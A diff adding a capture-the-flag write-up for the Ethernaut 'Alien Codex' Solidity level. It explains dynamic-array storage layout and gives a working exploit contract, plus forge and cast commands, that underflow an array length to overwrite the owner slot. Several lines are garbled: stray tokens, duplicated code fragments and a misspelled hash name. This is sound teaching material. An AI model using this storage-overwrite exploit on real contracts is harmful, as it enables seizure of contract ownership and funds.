@@ -1,0 +1,109 @@
+"Our only objective here is to become the owner of the contract. To complete this level, we must know the concept of dynamic arrays and how their slot packing works, along with overflows and underflows. Let's dive in.
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import '../helpers/Ownable-05.sol';
+
+contract AlienCodex is Ownable {
+
+  bool public contact;
+  bytes32[] public codex;
+
+  modifier contacted() {
+    assert(contact);
+    _;
+  }retract
+
+  function make_contact() public {
+    contact = true;
+  }
+
+  function record(bytes32 _content) contacted public {
+      codex.push(_content);
+  }
+
+  function retract() contacted public {
+    codex.length--;
+  }
+
+  function revise(uint i, bytes32 _content) contacted public {
+    codex[i] = _content;
+  }
+}
+
+We can see in the above contract that there's no owner variable. This is because it is coming from the inherited Ownable contract. If we look into the Ownable.sol, we can see that the variable address private _owner; is defined in the slot 0 of the contract. 
+retract
+owner
+Ownable
+Ownable.sol
+address private _owner;
+pragma solidity ^0.5.0;
+
+// some comments
+contract Ownable {
+    address private _owner;
+...
+
+Now that that's clear, let's learn how dynamic arrays work. 
+Assuming the dynamic array starts at a slot location p, then the slot p will contain the total number of elements stored in the array, and the actual array data will be stored at keccack256(p). More info on this can be found in the Solidity Docs.  
+p
+p
+keccack256(p)
+Let's go through the organization of the storage layout in our vulnerable contract:
+bool public contact
+address private _owner
+To finish the level we need to do the following steps:
+make_contact()
+contact
+true
+contacted()
+retract()
+codex.length
+codex.length
+revise()
+_owner
+i
+uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
+
+The _content is of type bytes32 which means we need to convert our address to bytes32. This can be done using the following code:
+_content
+bytes32
+bytes32
+bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
+
+Here's how the exploit code looks:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import ""../instances/Ilevel19.sol"";
+
+contract AlienHack {
+    AlienCodex level19 = AlienCodex(0x752dD58810d09984504e080098A0c3Cf26C9093e);
+
+    function exploit () external {
+        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
+        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
+        level19.make_contact();
+        level19.retract();
+        level19.revise(index, myAddress);
+    }
+}
+
+We are calculating the index on which the slot 0 exists, converting our address to bytes32. The function retract() is called to underflow the array and then it is updated using the revise() function which is storing our address into the _owner variable in slot 0. 
+bytes32
+retract()
+revise()
+_owner
+Let's deploy the contract using the following command:
+forge create AlienHack --private-key $PKEY --rpc-url $RPC_URL
+
+and call our exploit() function which will make us the owner:
+exploit()
+cast send 0xb8131b26fa82A0d09fd7Aa186F7157418774e192 ""exploit()"" --private-key $PKEY --rpc-url $RPC_URL
+
+
+We can check the new owner through the console using await contract.owner(). The instance can now be submitted to finish the level. 
+await contract.owner()
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+My article on setting up your workspace to get started with Ethernaut using Foundry and Solidity - blog.dixitaditya.com/getting-started-with-e..
+Never allow modification of the array length of a dynamic array as they can overwrite the whole contract's storage using overflows and underflows. "
